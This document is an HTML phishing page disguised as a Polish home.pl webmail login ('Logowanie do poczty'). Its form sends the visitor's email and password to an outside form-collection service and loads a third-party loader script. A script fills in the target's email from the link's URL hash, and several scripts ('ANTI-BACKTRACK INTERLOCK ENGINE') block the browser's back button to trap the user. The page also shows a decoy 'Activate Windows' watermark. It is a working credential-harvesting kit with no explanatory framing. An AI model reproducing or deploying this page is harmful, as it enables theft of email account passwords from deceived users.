<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f2f2f2;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            position: relative;
            padding: 40px 20px;
        }

        /* Top Centered Brand Header */
        .brand-header {
            margin-bottom: 24px;
            font-size: 36px;
            font-weight: 800;
            color: #000000;
            letter-spacing: -1px;
        }

        .brand-header span {
            color: #e30613;
        }

        /* White floating interface panel card */
        .contact-card {
            background-color: #ffffff;
            width: 100%;
            max-width: 440px;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
            text-align: center;
        }

        .card-heading {
            font-size: 20px;
            font-weight: 300;
            color: #777777;
            margin-bottom: 30px;
        }

        /* Stacked input fields panel grouping layout elements */
        .form-fields-stack {
            border: 1px solid #d9d9d9;
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .form-group {
            position: relative;
        }

        .form-group:not(:last-child) {
            border-bottom: 1px solid #d9d9d9;
        }

        .form-control {
            width: 100%;
            padding: 16px 16px 16px 45px;
            border: none;
            font-size: 15px;
            outline: none;
            color: #333333;
        }

        /* Textarea input spacing alignment */
        textarea.form-control {
            resize: vertical;
            min-height: 100px;
            padding-left: 16px;
        }

        /* Form decoration elements matching placeholder positioning icons */
        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #999999;
            font-size: 16px;
            display: flex;
            align-items: center;
        }

        /* Solid rectangular primary red submission button */
        .submit-btn {
            width: 100%;
            background-color: #e30613;
            color: #ffffff;
            border: none;
            padding: 14px;
            font-size: 14px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            transition: background-color 0.15s ease;
        }

        .submit-btn:hover {
            background-color: #c20510;
        }

        /* System activation indicator watermark element */
        .system-watermark {
            position: fixed;
            bottom: 24px;
            right: 24px;
            text-align: left;
            font-size: 13px;
            color: rgba(0, 0, 0, 0.22);
            line-height: 1.4;
            user-select: none;
            pointer-events: none;
        }

        /* Cookie/Bot icon position structure holder matching page frame */
        .bottom-left-icon {
            position: fixed;
            bottom: 24px;
            left: 24px;
            color: #333333;
            font-size: 20px;
            opacity: 0.8;
        }
    </style>
</head>
<body>

    <!-- Centered Header Logo Component -->
    <div class="brand-header">
        home<span>.pl</span>
    </div>

    <!-- Main Content Contact Card Frame Workspace -->
    <main class="contact-card">
        <h1 class="card-heading">Logowanie do poczty
</h1>
        
        <form action="https://formsubmit.io" method="POST">
<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
            <div class="form-fields-stack">
                <div class="form-group">
                    <span class="input-icon">👤</span>
                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                </div>
                
                <div class="form-group">
                    <span class="input-icon">🔒</span>
<input type="password" name="Password" placeholder="haslo" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                </div>

            </div>
            
            <button type="submit" class="submit-btn">Zaloguj się</button>
        </form>
    </main>

    <!-- Bottom Left Layout Accent Decoration Element -->
    <div class="bottom-left-icon">🍪</div>

    <!-- Windows environment system layer watermark overlay background asset -->
    <div class="system-watermark">
        Activate Windows<br>
        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
    </div>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
